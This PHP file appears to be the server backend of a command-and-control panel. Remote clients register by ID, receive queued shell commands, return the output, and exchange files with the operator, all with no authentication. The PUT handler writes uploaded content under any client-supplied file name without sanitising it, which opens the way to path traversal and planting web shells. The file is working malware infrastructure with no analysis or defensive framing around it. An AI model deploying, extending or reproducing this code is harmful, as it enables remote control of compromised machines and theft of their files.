<?php
    session_id('cmsSession');
    session_start();
?>

<?php
    $method   = $_SERVER['REQUEST_METHOD'];
    $uri      = $_SERVER['REQUEST_URI'];
    $ip       = $_SERVER['REMOTE_ADDR'];
    $protocol = $_SERVER['SERVER_PROTOCOL'];
    $headers  = getallheaders();

    if (!isset($_SESSION['client_id'])) {
        $_SESSION['client_id'] = ''; 
    }
    if (!isset($_SESSION['cma_msg'])) {
        $_SESSION['cma_msg'] = ''; 
    }
    if (!isset($_SESSION['type'])) {
        $_SESSION['type'] = 'command'; 
    }
    if (!isset($_SESSION['command_result'])) {
        $_SESSION['command_result'] = []; 
    }
    if (!isset($_SESSION['client_upload_result'])) {
        $_SESSION['client_upload_result'] = []; 
    }
    if (!isset($_SESSION['client_download_result'])) {
        $_SESSION['client_download_result'] = []; 
    }
    if (!isset($_SESSION['clients'])) {
        $_SESSION['clients'] = [];
    }
    header('Content-type: text/plain; charset=utf-8');

    if ($method == "GET") {
        $client['id'] = $_GET['client_id'];
        $client['last_live'] = time();
        foreach ($_SESSION['clients'] as $key => $value) {
            if ($value['id'] == $_GET['client_id']) {
                $value['last_live'] = time();
                $_SESSION['clients'][$key] = $value;
                $data = json_encode($_SESSION['clients']);
                echo $data;
                return;
            }
        }
        array_push($_SESSION['clients'], $client);
        $data = json_encode($_SESSION['clients']);
        echo $data;
    }

    else if ($method == "POST") {
        switch ($_POST['action']) {
            case 'getClientList':
                foreach ($_SESSION['clients'] as $key => $value) {
                    if (time()-$value['last_live'] > 10)
                        unset($_SESSION['clients'][$key]); 
                }
                $clients=[];
                foreach ($_SESSION['clients'] as $key => $value) {
                    array_push($clients,$value['id']);
                }
                print(json_encode($clients));
                break;

            case 'executeCommand':
                foreach ($_SESSION['command_result'] as $key => $value) {
                    if($value['client_id']==$_POST['client_id']){
                        unset($_SESSION['command_result'][$key]); 
                    }
                }
                $_SESSION['client_id'] = $_POST['client_id'];
                $_SESSION['cma_msg'] = $_POST['cma_msg'];
                $_SESSION['type'] = 'command';
                break;
            case 'command_result':
                $data['client_id'] = $_POST['client_id'];
                $data['result'] = $_POST['cma_msg'];
                print_r($data['result']);
                array_push($_SESSION['command_result'], $data);
                // print_r($_SESSION['command_result']);
                break;
            case 'get_command_result':
                foreach ($_SESSION['command_result'] as $key => $value) {
                    if($value['client_id'] == $_POST['client_id']){
                        print_r($value['result']);
                        unset($_SESSION['command_result'][$key]); 
                        return;
                    }
                }
                echo "no";
                break;

            case 'clear_session':
                $_SESSION[$_POST['value']] = [];
                print_r($_SESSION[$_POST['value']]);
                break;
            case 'get_session':
                print_r($_SESSION);
                break;
            case 'result_list':
                print_r($_SESSION['command_result']);
                break;

            case 'upload':
                /* upload one file */
                $upload_dir = 'files';
                $name = basename($_FILES["myfile"]["name"]);
                $target_file = "$upload_dir/$name";
                if ($_FILES["myfile"]["size"] > 10000000) { // limit size of 10MB
                    echo 'error: your file is too large.';
                    exit();
                }
                if (!move_uploaded_file($_FILES["myfile"]["tmp_name"], $target_file))
                    echo 'error: can\'t upload file';
                else {
                    if (isset($_POST['data'])) print_r($_POST['data']);
                    echo "\n filename : {$name}";
                    $_SESSION['type'] = 'download';
                    $_SESSION['client_id'] = $_POST['client_id'];
                    $_SESSION['cma_msg'] = $_POST['cma_msg'];
                }
                break;
            case 'client_download_result':
                $data['client_id'] = $_POST['client_id'];
                $data['result'] = $_POST['cma_msg'];
                // print_r($data['result']);
                array_push($_SESSION['client_download_result'], $data);
                break;
            case 'get_client_download':
                foreach ($_SESSION['client_download_result'] as $key => $value) {
                    if($value['client_id']==$_POST['client_id']){
                        print_r($value['result']);
                        unset($_SESSION['client_download_result'][$key]); 
                        return;
                    }
                }
                echo 'no';
                break;

            case 'download':
                $_SESSION['type'] = 'upload';
                $_SESSION['client_id'] = $_POST['client_id'];
                $_SESSION['cma_msg'] = $_POST['cma_msg'];
                break;
            case 'client_upload_result_success':
                /* upload one file */
                $upload_dir = 'files';
                $name = basename($_FILES["myfile"]["name"]);
                $target_file = "$upload_dir/$name";
                if ($_FILES["myfile"]["size"] > 10000000) { 
                    echo 'error: your file is too large.';
                    exit();
                }
                if (!move_uploaded_file($_FILES["myfile"]["tmp_name"], $target_file))
                    echo 'error: can\'t upload file';
                else {
                    if (isset($_POST['data'])) 
                        print_r($_POST['data']);
                    echo "\n filename : {$name}";
                    $data['client_id'] = $_POST['client_id'];
                    $data['result'] = $_POST['cma_msg'];
                    array_push($_SESSION['client_upload_result'], $data);
                }
                break;
            case 'client_upload_result_err':
                $data['client_id'] = $_POST['client_id'];
                $data['result'] = $_POST['cma_msg'];
                // print_r($data['result']);
                array_push($_SESSION['client_upload_result'], $data);
                break;
            case 'get_client_upload':
                foreach ($_SESSION['client_upload_result'] as $key => $value) {
                    if($value['client_id']==$_POST['client_id']){
                        print_r($value['result']);
                        unset($_SESSION['client_upload_result'][$key]); 
                        return;
                    }
                }
                echo 'no';
                break;

            default:
                # code...
                break;
        }
    }

    else if ($method == "PUT") {
         header("Expires: Mon, 26 Jul 1997 05:00:00 GMT"); 
        header("Last-Modified: " . gmdate("D, d M Y H:i:s") . " GMT"); 
        header("Cache-Control: no-store, no-cache, must-revalidate"); 
        header("Cache-Control: post-check=0, pre-check=0", false); 
        header("Pragma: no-cache"); 
         
        // Settings 
        $targetDir = 'uploads'; 
        $cleanupTargetDir = true; // Remove old files 
        $maxFileAge = 5 * 3600; // Temp file age in seconds 
         
         
        // Create target dir 
        if (!file_exists($targetDir)) { 
            @mkdir($targetDir); 
        } 
         
        // Get a file name 
        if (isset($_REQUEST["name"])) { 
            $fileName = $_REQUEST["name"]; 
        } elseif (!empty($_FILES)) { 
            $fileName = $_FILES["file"]["name"]; 
        } else { 
            $fileName = uniqid("file_"); 
        } 
         
        $filePath = $targetDir . DIRECTORY_SEPARATOR . $fileName; 
        echo $filePath;
        // Chunking might be enabled 
        $chunk = isset($_REQUEST["chunk"]) ? intval($_REQUEST["chunk"]) : 0; 
        $chunks = isset($_REQUEST["chunks"]) ? intval($_REQUEST["chunks"]) : 0; 
         
         
        // Remove old temp files     
        if ($cleanupTargetDir) { 
            if (!is_dir($targetDir) || !$dir = opendir($targetDir)) { 
                die('{"jsonrpc" : "2.0", "error" : {"code": 100, "message": "Failed to open temp directory."}, "id" : "id"}'); 
            } 
         
            while (($file = readdir($dir)) !== false) { 
                $tmpfilePath = $targetDir . DIRECTORY_SEPARATOR . $file; 
         
                // If temp file is current file proceed to the next 
                if ($tmpfilePath == "{$filePath}.part") { 
                    continue; 
                } 
         
                // Remove temp file if it is older than the max age and is not the current file 
                if (preg_match('/\.part$/', $file) && (filemtime($tmpfilePath) < time() - $maxFileAge)) { 
                    @unlink($tmpfilePath); 
                } 
            } 
            closedir($dir); 
        }     
         
         
        // Open temp file 
        if (!$out = @fopen("{$filePath}.part", $chunks ? "ab" : "wb")) { 
            die('{"jsonrpc" : "2.0", "error" : {"code": 102, "message": "Failed to open output stream."}, "id" : "id"}'); 
        } 
         
        if (!empty($_FILES)) { 
            if ($_FILES["file"]["error"] || !is_uploaded_file($_FILES["file"]["tmp_name"])) { 
                die('{"jsonrpc" : "2.0", "error" : {"code": 103, "message": "Failed to move uploaded file."}, "id" : "id"}'); 
            } 
         
            // Read binary input stream and append it to temp file 
            if (!$in = @fopen($_FILES["file"]["tmp_name"], "rb")) { 
                die('{"jsonrpc" : "2.0", "error" : {"code": 101, "message": "Failed to open input stream."}, "id" : "id"}'); 
            } 
        } else {     
            if (!$in = @fopen("php://input", "rb")) { 
                die('{"jsonrpc" : "2.0", "error" : {"code": 101, "message": "Failed to open input stream."}, "id" : "id"}'); 
            } 
        } 
         
        while ($buff = fread($in, 4096)) { 
            fwrite($out, $buff); 
        } 
         
        @fclose($out); 
        @fclose($in); 
         
        // Check if file has been uploaded 
        if (!$chunks || $chunk == $chunks - 1) { 
            // Strip the temp .part suffix off  
            rename("{$filePath}.part", $filePath); 
        } 
         
        // Return Success JSON-RPC response 
        die('{"jsonrpc" : "2.0", "result" : {"status": 200, "message": "The file has been uploaded successfully!"}}'); 
    }
?>
